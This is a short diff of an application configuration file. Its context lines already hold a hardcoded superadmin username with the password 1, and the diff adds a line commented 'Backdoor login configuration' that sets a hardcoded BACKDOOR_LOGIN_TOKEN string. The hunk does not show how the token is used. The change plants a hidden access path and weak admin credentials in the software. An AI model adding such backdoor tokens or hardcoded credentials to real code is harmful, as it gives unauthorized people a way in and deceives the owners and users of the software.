@@ -68,3 +68,8 @@ MIN_USER_SWIPE_ACCESSABLE = 200
 
 superadmin_username = "gomgom" 
 password = 1
+
+
+# Backdoor login configuration
+BACKDOOR_LOGIN_TOKEN = "gomgomganteng"
+
